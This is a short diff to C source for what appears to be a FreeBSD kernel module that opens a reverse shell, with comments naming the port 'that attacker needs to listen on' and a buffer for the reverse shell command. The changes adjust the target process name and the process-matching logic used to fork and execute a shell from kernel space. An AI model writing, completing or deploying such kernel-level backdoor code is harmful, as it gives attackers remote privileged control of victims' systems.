@@ -41,7 +41,7 @@ extern int kern_execve(struct thread *td, struct image_args *args, struct mac *m
 // define port that attacker needs to listen on
 #define LISTEN_PORT 7000
 // define the name of the process we will fork and kern_execve() in
-#define TARGET_PROC "/bin/sh"
+#define TARGET_PROC "sh"
 // Global dynamic string for reverse shell
 char reverse_shell_cmd[100];
 // Define stack protection so we can use snprintf
@@ -200,7 +200,7 @@ static struct proc *find_process_by_name(const char *name) {
     sx_slock(&allproc_lock);  // Lock process list
     LIST_FOREACH(p, &allproc, p_list) {
         PROC_LOCK(p);
-        if (strncmp(p->p_comm, name, 7) == 0) {
+        if (strcmp(p->p_comm, name) == 0) {
             PROC_UNLOCK(p);
             printf("got one\n");
             sx_sunlock(&allproc_lock);
